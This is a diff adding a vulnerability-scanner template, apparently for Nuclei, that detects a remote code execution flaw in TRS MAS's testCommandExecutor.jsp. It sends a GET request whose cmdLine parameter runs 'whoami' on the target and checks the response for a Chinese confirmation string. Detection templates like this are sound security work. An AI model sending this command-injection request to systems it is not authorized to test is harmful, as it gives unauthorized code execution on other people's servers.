@@ -1,0 +1,19 @@
+id: poc-yaml-trs-mas-testcommandexecutor-jsp-rce
+info:
+  name: TRS MAS testCommandExecutor.jsp Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/mas/sysinfo/testCommandExecutor.jsp?cmdLine=whoami&workDir=&pathEnv=&libPathEnv="
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "测试命令行进程执行"
